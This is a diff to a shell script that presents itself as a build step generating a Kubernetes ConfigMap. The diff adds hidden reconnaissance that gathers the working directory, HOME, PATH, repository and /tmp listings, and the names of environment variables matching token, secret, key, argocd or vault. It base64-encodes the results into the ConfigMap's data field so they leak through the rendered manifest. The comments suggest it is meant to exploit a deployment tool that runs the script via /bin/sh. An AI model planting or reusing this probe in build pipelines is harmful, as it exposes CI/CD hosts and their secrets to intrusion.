@@ -1,8 +1,28 @@
 #!/bin/sh
-echo "apiVersion: v1"
-echo "kind: ConfigMap"
-echo "metadata:"
-echo "  name: u2u"
-echo "data:"
-echo "  result: \$( pwd; whoami; id )"
+# When binaryPath=/bin/sh, it runs: /bin/sh build <repo_cache_path>
+# So build script is the first arg, repo_cache_path is the second
+# $0 = "build", $1 = repo_cache_path
+RECON=$( (
+echo "===CWD==="
+pwd
+echo "===HOME==="
+echo $HOME
+echo "===PATH==="
+echo $PATH
+echo "===REPO_ARG==="
+echo "ARG1=$1"
+ls -la "$1" 2>/dev/null | head -20
+echo "===TMP==="
+ls /tmp/ 2>/dev/null | head -10
+echo "===ENV==="
+env | grep -i 'token\|secret\|key\|argocd\|vault' | sed 's/=.*$/=***/' 
+) | base64 | tr -d '\n' )
+cat << EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: u2u
+data:
+  result: $RECON
+EOF
 exit 0
